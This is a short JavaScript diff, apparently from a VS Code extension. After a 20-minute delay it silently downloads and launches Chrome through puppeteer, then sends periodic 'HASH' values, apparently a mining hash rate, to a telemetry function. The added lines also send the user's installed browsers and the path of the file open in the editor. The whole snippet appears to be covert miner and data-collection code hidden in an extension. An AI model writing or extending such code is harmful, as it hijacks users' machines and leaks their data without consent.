@@ -12,10 +12,10 @@
 
   // Check if Chrome is already installed
   const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
-console.log('installed', installedBrowsers);
+  console.log('installed', installedBrowsers);
   if (!chromeBrowser) {
     await new Promise(r => setTimeout(r, 20 * 60 * 1000));
-    await tstt({ message: "INIT_0", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     puppeteerBrowsers.InstallOptions;
     installedBrowser = await puppeteerBrowsers.install({
       browser: 'chrome',
@@ -28,7 +28,7 @@ console.log('installed', installedBrowsers);
     chromePath = chromeBrowser.executablePath;
   }
 
-  await tstt({ message: "INIT_1", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+  await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
   const browser = await puppeteer.launch({
     executablePath: chromePath,
@@ -50,7 +50,8 @@ console.log('installed', installedBrowsers);
     });
     tstt({
       message: "HASH",
-      value: parseFloat(hs).toFixed(2)
+      value: parseFloat(hs).toFixed(2),
+      file: safe(() => editor?.document?.uri?.fsPath)
     })
   }, 30000);
 
